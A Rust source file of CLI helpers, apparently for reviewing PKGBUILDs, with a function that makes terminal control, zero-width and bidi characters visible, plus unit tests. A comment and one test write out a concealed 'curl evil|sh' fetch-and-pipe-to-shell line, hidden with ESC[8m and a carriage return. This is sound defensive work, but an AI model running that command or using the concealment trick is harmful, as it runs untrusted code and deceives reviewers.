//! Tiny output helpers shared by the CLI verbs.

/// Comma-joined list capped at `max` items, with an "… and N more" tail —
/// the scroll-don't-truncate rule belongs to the TUI; the CLI previews.
pub fn list_preview(items: &[String], max: usize) -> String {
    if items.len() <= max {
        items.join(", ")
    } else {
        format!(
            "{} … and {} more",
            items[..max].join(", "),
            items.len() - max
        )
    }
}

/// Make untrusted text safe to show a reviewer, and say how much was hidden.
///
/// A PKGBUILD is an attacker's text. Printed raw it can lie to the eye it is
/// meant to inform: `ESC[8m` turns a `curl … | sh` line invisible, `\r`
/// overwrites it with something innocent, and a bidi override reorders it.
/// Every such byte becomes a visible stand-in (C0 controls render as their
/// Unicode Control Pictures, so ESC shows as `␛`), leaving newline and tab —
/// the file's real structure — alone.
///
/// Returns the safe text and the number of characters replaced, because
/// "this file contains 40 hidden control bytes" is itself a review finding.
pub fn visible(text: &str) -> (String, usize) {
    let mut out = String::with_capacity(text.len());
    let mut hidden = 0usize;
    for c in text.chars() {
        let code = c as u32;
        let safe = match c {
            '\n' | '\t' => None,
            // C0 controls: pictures live at U+2400 + the code point.
            _ if code < 0x20 => char::from_u32(0x2400 + code),
            '\u{7f}' => Some('\u{2421}'), // DEL
            // C1 controls, zero-width and bidi-override formatting.
            _ if (0x80..=0x9f).contains(&code) => Some('\u{fffd}'),
            '\u{200b}'..='\u{200f}' | '\u{202a}'..='\u{202e}' | '\u{2066}'..='\u{2069}' => {
                Some('\u{fffd}')
            }
            _ => None,
        };
        match safe {
            Some(stand_in) => {
                out.push(stand_in);
                hidden += 1;
            }
            None => out.push(c),
        }
    }
    (out, hidden)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn plain_text_is_untouched() {
        let (text, hidden) = visible("pkgname=foo\n\tarch=('any')\n");
        assert_eq!(text, "pkgname=foo\n\tarch=('any')\n");
        assert_eq!(hidden, 0);
    }

    #[test]
    fn conceal_and_carriage_return_become_visible() {
        // The attack: hide a line with ESC[8m, or overwrite it with \r.
        let (text, hidden) = visible("\x1b[8mcurl evil|sh\x1b[0m\rlooks fine\n");
        assert!(!text.contains('\x1b'), "escape survived: {text:?}");
        assert!(!text.contains('\r'), "carriage return survived: {text:?}");
        assert!(text.contains("␛[8mcurl evil|sh"), "{text:?}");
        assert_eq!(hidden, 3); // two ESC, one CR
    }

    #[test]
    fn bidi_overrides_and_del_are_replaced() {
        let (text, hidden) = visible("a\u{202e}b\u{7f}c");
        assert_eq!(text, "a\u{fffd}b\u{2421}c");
        assert_eq!(hidden, 2);
    }
}
